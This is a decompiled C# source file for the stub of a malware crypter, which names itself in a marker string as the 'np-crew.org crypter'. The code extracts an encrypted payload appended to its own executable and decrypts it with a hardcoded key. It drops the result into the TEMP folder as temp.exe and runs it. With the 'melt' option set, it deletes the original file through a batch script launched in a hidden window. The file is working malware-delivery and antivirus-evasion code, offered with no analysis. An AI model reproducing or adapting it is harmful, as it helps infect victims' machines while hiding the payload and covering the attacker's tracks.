using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace npcrew;

[StandardModule]
internal sealed class Module1
{
	[STAThread]
	public static void Main()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		FileSystem.FileCopy(Assembly.GetExecutingAssembly().Location, Interaction.Environ("TEMP") + "\\read.exe");
		string text = Interaction.Environ("TEMP") + "\\read.exe";
		string text2 = Interaction.Environ("TEMP") + "\\temp.exe";
		short num = checked((short)FileSystem.FreeFile());
		FileSystem.FileOpen((int)num, text, (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
		string text3;
		checked
		{
			text3 = Strings.Space((int)FileSystem.LOF(unchecked((int)num)));
		}
		FileSystem.FileGet((int)num, ref text3, -1L, false);
		FileSystem.FileClose(new int[1] { num });
		string[] array = Strings.Split(text3, "|||np-crew.org crypter by mastermaefju|||", -1, (CompareMethod)0);
		string text4 = array[1];
		string[] array2 = Strings.Split(text4, "²³", -1, (CompareMethod)0);
		string text5 = array2[0];
		string pw = Module2.decrypt("mastermaefju4thewin", array2[1]);
		string text6 = Module2.decrypt(pw, array2[2]);
		FileSystem.FileOpen((int)num, text2, (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
		FileSystem.FilePut((int)num, text6, -1L, false);
		FileSystem.FileClose(new int[1] { num });
		Process process = new Process();
		process.StartInfo.FileName = text2;
		process.Start();
		if (Operators.CompareString(text5, "mt", false) == 0)
		{
			string text7 = Interaction.Environ("TEMP") + "\\melt.bat";
			StreamWriter streamWriter = new StreamWriter(text7);
			streamWriter.WriteLine("@echo off");
			streamWriter.WriteLine("del " + location);
			streamWriter.Flush();
			streamWriter.Close();
			Process process2 = new Process();
			process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process2.StartInfo.CreateNoWindow = true;
			process2.StartInfo.FileName = text7;
			process2.Start();
		}
	}
}
